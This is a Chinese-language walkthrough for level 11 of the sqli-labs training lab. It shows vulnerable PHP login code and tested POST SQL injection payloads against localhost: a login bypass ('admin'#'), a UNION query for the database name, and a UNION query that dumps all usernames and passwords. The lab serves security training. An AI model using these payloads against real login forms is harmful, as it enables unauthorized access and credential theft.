# Less-11

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | POST · 报错型 |
| **闭合方式** | `'` |
| **注释符** | `# · POST 表单必须用它，--+ 会失效` |
| **成败信号** | 数据回显 + flag.jpg |
| **一句话** | 登录框注入 |
| **核心 payload** | `uname=admin' --+` |

---

**POST · 报错型 · 单引号**

### 源码

```php
$uname  = $_POST['uname'];
$passwd = $_POST['passwd'];
$sql = "SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
```

### 特点：从 URL 转到了表单

前 10 关都是 GET，从这关开始变成 POST。用 curl 或 Burp 提交：

```bash
curl -s -X POST "http://localhost/sqli-labs-master/Less-11/" \
     --data-raw "uname=admin%27%23&passwd=x"
```

> ⚠️ **这关的注释符要用 `#`，不要用 `--+`**
>
> 因为 payload 是填进**表单输入框**的，浏览器会把字面的 `+` 转义成 `%2B`，
> 服务器收到的是「减号 减号 加号」而不是「减号 减号 空格」，MySQL 不认 → 语法错误。
>
> | 输入框里填 | 结果 |
> |---|---|
> | `admin'#` | ★ 成功 |
> | `admin' -- qwe` | ★ 成功 |
> | `admin' --+` | ✗ 报错 `near 'x' LIMIT 0,1'` |
>
> （原理详见第零章「1. 注释符」。如果你是用 Burp 手工构造请求体、让 `+` 当真空格，那 `--+` 也能用。）
>
> 另外一点：curl 别用 `--data-urlencode`（`+` 会被它编码成 `%2B`）。
> 上面用的是 `--data-raw` 自己控制编码：`%27` = `'`，`%23` = `#`。
> 嫌麻烦就用 **Burp Suite** 抓包改，或浏览器 F12 → 网络 → 右键请求 → 编辑并重发。

### 闭合原理

```
原句：... WHERE username='$uname' and password='$passwd' LIMIT 0,1
输入 uname = admin'#
结果：... WHERE username='admin'# and password='...' LIMIT 0,1
                                  ↑ 密码校验被注释掉了！
```

这就是最经典的**万能密码**：不需要知道密码，直接把密码判断注释掉。

### 通关 payload（实测）

**① 万能密码登录**
```
uname = admin'#
passwd = 随便填
→ 成功  user=admin  pass=admin
```

**② UNION 查库名**
```
uname = -1' union select 1,database()#
passwd = x
→ 页面显示  user=1  pass=security
```

**③ 拖库**
```
uname = -1' union select 1,group_concat(username,0x3a,password) from users#
passwd = x
→  13 条账号密码全部显示在用户名/密码位置
```

---

[← Less-10](Less-10.md) ｜ [返回目录](README.md) ｜ [Less-12 →](Less-12.md)